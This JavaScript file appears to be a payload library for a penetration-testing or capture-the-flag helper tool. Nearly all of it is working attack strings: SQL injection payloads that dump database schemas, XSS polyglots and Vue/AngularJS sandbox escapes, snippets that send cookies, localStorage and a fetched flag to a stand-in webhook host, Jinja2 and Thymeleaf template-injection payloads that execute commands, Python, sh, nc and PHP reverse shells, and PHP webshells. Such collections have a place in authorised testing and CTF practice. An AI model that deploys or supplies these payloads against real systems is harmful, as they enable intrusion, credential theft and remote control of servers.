window.Payload = {}

window.Payload.SQLi = {
  spaceToComment: value => value.replace(/[^\S\r\n]+/g, '/**/'),

  polyglot: value => "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",

  MySQL: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' +
        Array.from(Array(columns + 1).keys()).slice(1).join(',')
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(schema_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.schemata'
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(table_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.tables where table_schema=database()'
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(column_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.columns where table_schema=database()'
    },

    // PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/
    dumpInOneShot: value => "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",

    dumpCurrentQueries: value => '(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a)',

    errorBased: ({ columns, position }) => {
      return 'extractvalue(0x0a,concat(0x0a,(select database())))'
    }
  },

  PostgreSQL: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' + Array(columns).fill('null').join(',')
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(datname, ',')"

      return 'union select ' + fields.join(',') + ' from pg_database'
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(tablename, ',')"

      return ' union select ' + fields.join(',') +
        " from pg_tables where schemaname='public'"
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(column_name, ',')"

      return 'union select ' + fields.join(',') +
        " from information_schema.columns where table_schema='public'"
    },

    errorBased: ({ columns, position }) => {
      return 'cast(version() as int)'
    }
  },
  SQLite: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' +
        Array.from(Array(columns + 1).keys()).slice(1).join(',')
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(name)'

      return 'union select ' + fields.join(',') +
        " from sqlite_master WHERE type='table'"
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(sql)'

      return 'union select ' + fields.join(',') +
        " from sqlite_master WHERE type='table'"
    }
  }
}

window.Payload.XSS = {
  polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",

  Vue: {
    vue2Interpolation: value => '{{_c.constructor`alert()`()}}',
    vue2Directive: value => '<x/v-=_c.constructor`alert()`()>',
    vue3Interpolation: value => '{{$emit.constructor`alert()`()}}',
    vue3DynamicComponent: value => '<component is=script text=alert()>'  
  },

  AngularJS: {
    angularJS1_6WithPrototype$on: value => '<div ng-app ng-csp>{{$on.curry.call().alert()}}</div>',
    // Author: Gareth Heyes (PortSwigger)
    angularJSWith$event: value => `<div ng-app ng-csp><input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1], alert)'"></div>`
  },

  snippets: {
    getSamesiteFlag: value => 'fetch(`/flag`).then(t=>t.text()).then(t=>location=`https://webhook/?f=`+encodeURIComponent(t))',
    getCookieFlag: value => 'location=`https://webhook/?f=`+encodeURIComponent(document.cookie)',
    getStorageFlag: value => 'location=`https://webhook/?f=`+encodeURIComponent(localStorage.flag)'
  }
}

window.Payload.LFI = {
  phpWrapperBas64: value => 'php://filter/convert.base64-encode/resource=' + value
}

window.Payload.SSTI = {
  Jinja2: {
    tuple2AllSubclasses: value => '{{().__class__.__base__.__subclasses__()}}',
    tuple2RCE: value => "{%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}",
    g2RCE: value => "{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    urlFor2RCE: value => "{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    application2RCE: value => "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    // config2RCE Reference: https://twitter.com/realgam3/status/1184747565415358469
    config2RCE: value => "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    getFlashedMessages2RCE: value => "{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    self2RCE: value => "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    lipsum2RCE: value => "{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    cycler2RCE: value => "{{cycler.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    joiner2RCE: value => "{{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    namespace2RCE: value => "{{namespace.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
    addUrlRule: value => "{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}"
    // TODO: add features to bypass filter keywords like __ '' "" []
  },
  Java: {
    thymeleafRCE: value => '__${T(java.lang.Runtime).getRuntime().exec("nc ip port -e sh")}__::.x',
    commonRCE: value => "${T(java.lang.Runtime).getRuntime().exec('ls')}"
  }
}

// TODO: show prompt for RHOST and RPORT 
window.Payload.Shell = {
  Python: {
    py3: value => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
    py: value => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
  },
  sh: {
    withI: value => 'sh -i >& /dev/tcp/RHOST/RPORT 0>&1',
    withoutI: value => '0<&196;exec 196<>/dev/tcp/RHOST/RPORT;sh <&196 >&196 2>&196'
  },
  nc: {
    withE: value => 'nc -e /bin/sh RHOST RPORT',
    withC: value => 'nc -c bash RHOST RPORT'
  },
  php: {
    reverseShell: value => `php -r '$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");'`,
    webshellEval: value => '<?=eval($_GET[_]);',
    webshellExec: value => '<?=exec($_GET[_]);',
    webshellSystem: value => '<?=system($_GET[_]);',
    webshellBackquote: value => '<?=`$_GET[_]`;',
    webshellAllFunction: value => '<?=($_GET[ÿ])($_GET[_]);',
    webshellNoAlphabetsDigits: value => '<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);'
  }
}
